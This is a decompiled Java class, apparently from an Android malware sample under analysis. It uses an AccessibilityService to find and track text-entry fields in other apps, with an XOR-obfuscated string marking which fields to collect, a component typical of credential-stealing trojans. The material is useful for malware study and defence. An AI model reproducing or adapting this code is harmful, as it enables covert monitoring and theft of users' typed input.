package com.zjxyxnvvp.nxvxchltf.j;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
import com.zjxyxnvvp.nxvxchltf.util.b;
import java.util.HashMap;
import java.util.Map;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class a {
    private static short[] $ = {2607, 2574, 2563, 2590, 2622, 2575, 2578, 2590};

    /* renamed from: a  reason: collision with root package name */
    public String f342a;

    /* renamed from: b  reason: collision with root package name */
    private Map<String, c> f343b = new HashMap();

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public a(String str) {
        this.f342a = str;
    }

    public void a(AccessibilityService accessibilityService, AccessibilityEvent accessibilityEvent) {
        for (AccessibilityNodeInfo accessibilityNodeInfo : b.b(UIDNwaidobaWIODb.e.b(), $(0, 8, 2666))) {
            if (!(accessibilityNodeInfo == null || accessibilityNodeInfo.getViewIdResourceName() == null)) {
                c cVar = this.f343b.get(accessibilityNodeInfo.getViewIdResourceName());
                if (cVar == null) {
                    cVar = new c(accessibilityNodeInfo.getViewIdResourceName());
                    this.f343b.put(accessibilityNodeInfo.getViewIdResourceName(), cVar);
                }
                cVar.a(accessibilityService, accessibilityNodeInfo);
            }
        }
    }

    public Map<String, c> b() {
        return this.f343b;
    }
}
